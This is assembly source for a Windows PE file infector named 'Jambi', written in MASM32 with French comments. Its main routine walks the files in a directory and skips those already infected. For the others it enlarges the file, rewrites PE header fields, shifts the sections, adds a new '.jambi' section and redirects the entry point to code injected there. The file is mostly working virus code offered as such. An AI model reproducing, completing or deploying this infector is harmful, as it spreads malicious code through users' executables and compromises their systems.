;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;                     _______           _     _                     ;;;;;;
;;;;;;                    (_______)         | |   (_)                    ;;;;;;
;;;;;;                         _ _____ ____ | |__  _                     ;;;;;;
;;;;;;                     _  | (____ |    \|  _ \| |                    ;;;;;;
;;;;;;                    | |_| / ___ | | | | |_) ) |                    ;;;;;;
;;;;;;                     \___/\_____|_|_|_|____/|_|                    ;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; C'est degueulasse


;virus_start:
;409000    call 0
;409005    pop eax               eip = eax = 409005
;409006    sub eax, 401005      409005 - 401005 = 8000
;          mov ebx, 400996
;          mov ecx, [ebx+eax]  400996 + 8000 = 408996



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                    DIRECTIVES                     ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.386
.model flat, stdcall
option casemap:none
assume fs:nothing

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                      INCLUDES                     ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	include		\masm32\include\masm32rt.inc
	includelib	\masm32\lib\user32.lib
	includelib	\masm32\lib\kernel32.lib

.code
	include			functions.asm
	include			utils.asm

jambi:
main PROC argc:DWORD, argv:DWORD
	
	include			variables.asm
	include			defines.asm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                       CODE                        ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	call		getKernelBaseAddr
	mov			KBaseAddress, eax




	;mov		nameOfCurrentFile, offset file

	
;;;;;;;;;
;;;;;;;;; Le file listing jle laisse ici pasque c'est un peu la partie centrale
;;;;;;;;; depuis laquelle on va appeller les fonctions d'infections.
;;;;;;;;;

sub		esp, 100		; WIN32_FIND_DATA (size: (11*4) + (?*?) + (14*?))

	;lea		ebx, wfdata
	;push	ebx
	push	esp
	push	offset s_pattern
	call	FindFirstFile	; Get first file
	mov		hFind, eax
	cmp		eax, INVALID_HANDLE_VALUE
	je		endOfListing


	;lea		ebx, [ebx+44]	; ebx point to the file name
	lea		ebx, [esp+44]
	mov		nameOfCurrentFile, ebx

loopInDirectory:

; BIG LOOP IN CDIRECTORY;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	pushad
	print	nameOfCurrentFile
	popad

	push		nameOfCurrentFile
	push		KBaseAddress
	call		isInfected		; isInfected = Return 0 (infected) or fileSize
	cmp			eax, 1
	je			nextFile

	
	push		400h
	push		nameOfCurrentFile
	push		KBaseAddress
	call		IncreaseFileSize

	cmp			eax, 0;test		eax, eax
	je			nextFile
	mov			fileSize, eax


	push		nameOfCurrentFile
	push		0ffffffffh
	call		fileOpen
	cmp			eax, 0;test		eax, eax
	je			nextFile
	mov			hFile, eax			; Save file handler

	push		hFile
	call		mapFile
	cmp			eax, 0;test		eax, eax
	je			nextFile
	mov			hMap, ebx
	mov			IBaseAddress, eax	; Sauvegarde de l adresse de base du mapping


	;; Check DOS/PE
	push		eax
	call		checkPE
	mov			peHeaderAddr, eax

	add			eax, 04h			; goto

;;;;;;;;;;;;;;;;;     	IMAGE_FILE_HEADER			;;;;;;;;;;;;;;;;;

	mov			bx, [eax+02h]		; Recuperation du nombre de sections.
	mov			ISectionCount, bx	; Sauvegarde du nombre de sections
	inc			word ptr [eax+02h]	; inc

;	mov			ebx, [eax+08h]		; inc ptr to sym table of filealignment
;	add			ebx, [eax+14h+24h]
;	mov			[eax+8h], ebx

	movzx		ebx, word ptr [eax+010h]	; on récupère OptionalHeaderSize

	add			eax, 14h			; goto

;;;;;;;;;;;;;;;;;     IMAGE_OPTIONAL_HEADER			;;;;;;;;;;;;;;;;;
	
	mov			edx, [eax+20h]		; on va chopper le SectionAlignment
	mov			ISectionAlignment, edx

	mov			edx, [eax+1ch]		; on va chopper le SectionAlignment
	mov			IImageBase, edx

	mov			edx, [eax+24h]		; on va chopper le FileAlignment
	mov			IFileAlignment, edx

	lea			edx, [eax+10h]		; On recupere l'addresse du entry point
	mov			IEntryPointAddr, edx

	mov			edx, [eax+3ch]		; on va chopper le Size of headers
	add			edx, IFileAlignment
	mov			[eax+3ch], edx

	mov			edx, [eax+04h]		; on va chopper le Size of code
	add			edx, IFileAlignment
	mov			[eax+04h], edx

	mov			edx, [eax+38h]		; on va chopper le Size of image
	add			edx, ISectionAlignment
	mov			[eax+38h], edx

	mov			edx, [eax+10h]		; on choppe le point d'entrée
	mov			IEntryPoint, edx

	add			eax, ebx			; on va au debut des header de sections

	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;               UPDATE SECTION HEADERS              ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                                                   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	;; Update les headers de sections (PointerToRawData)
	add			eax, 20				; On pointe sur le champe PointerToRawData du premier header
	movzx		ecx, ISectionCount	; Compteur de section
	mov			edx, 200h			; Valeur a ajouter aux offsets
	xor			ebx, ebx
	
updatePointers:
	cmp			[eax], ebx
	je			nextSection
	add			[eax], edx				; Ajoute 0x200 a l'offset
	mov			edi, [eax]
	
	mov			lastSectionRAddr, edi	; Get last section Raw Address
	mov			edi, [eax-4]
	mov			lastSectionRSize, edi	; Get last section Raw Size
	mov			edi, [eax-8]
	mov			lastSectionVAddr, edi	; Get last section RVA
	mov			edi, [eax-12]
	mov			lastSectionVSize, edi	; Get last section Virtual Size

nextSection:
	add			eax, 40
	dec			ecx
	test		ecx, ecx
	jne			updatePointers
	
	sub			eax, 20				; On se repositionne juste apres les headers de sections
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                                                   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                                                   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	push		fileSize
	push		IBaseAddress
	push		eax					; End of headers
	call		moveSections		; move sections in file
	mov			edi, eax			; End of headers

	push		lastSectionVAddr
	push		lastSectionVSize
	push		ISectionAlignment
	call		computeJambiAddr	; Get .jambi RVA
	mov			jambiVAddr, eax

	mov			edx, IEntryPointAddr
	mov			[edx], eax			; Update entry point with new RVA

	push		lastSectionRAddr
	push		lastSectionRSize
	push		IFileAlignment
	call		computeJambiAddr	; Get .jambi Raw offset
	mov			jambiRAddr, eax

	push		jambiRAddr			; Pointer to Raw Data
	push		IFileAlignment		; Virtual Size
	push		jambiVAddr			; Virtual Address
	push		edi					; End of header Address
	call		CreateSectionHeader

	push		IEntryPoint
	push		IImageBase
	push		jambiRAddr
	push		IBaseAddress
	call		addCodeInJambi		; Inject code in section .jambi
	jmp nextFile2

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                       END                         ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
nextFile:
	pushad
	print " FAIL", 13, 10
	popad
	jmp nextFile3
nextFile2:
	pushad
	print " OK", 13, 10
	popad
nextFile3:
	push		0
	push		IBaseAddress
	call		FlushViewOfFile
		
	push		IBaseAddress
	call		UnmapViewOfFile 
		
	push		hMap
	call		CloseHandle
		
	push		hFile
	call		CloseHandle

;nextFile:

	push		esp
	push		hFind
	call		FindNextFile	; Get next file

	cmp			eax, 0
	jne			loopInDirectory
	
	push		hFind
	call		FindClose
	
	add			esp, 100		; ~free(WIN32_FIND_DATA)

endOfListing:




	fn MessageBoxA, 0, "Injecting File(s)!", "INFO", MB_ICONINFORMATION
	push		eax
	call		ExitProcess
;donotinject:
;	fn MessageBoxA, 0, "File Already injected !", "fuck", MB_ICONINFORMATION
;	push	1234
;	call	ExitProcess
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                                                   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;                                                   ;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	;; Jambi exists :::: Injected code to exec
	;jambi_exists:

	

	fail:
	push	43
	call	ExitProcess

main ENDP
end	jambi




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;DOCS;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;MOD Entry Point
;MOD NumberOfSections

;MOD Size of code
;MOD Size of Image
;MOD Size of headers

;MOD Section headers

;ADD Section header
;ADD Section .jambi

;MOV Sections *






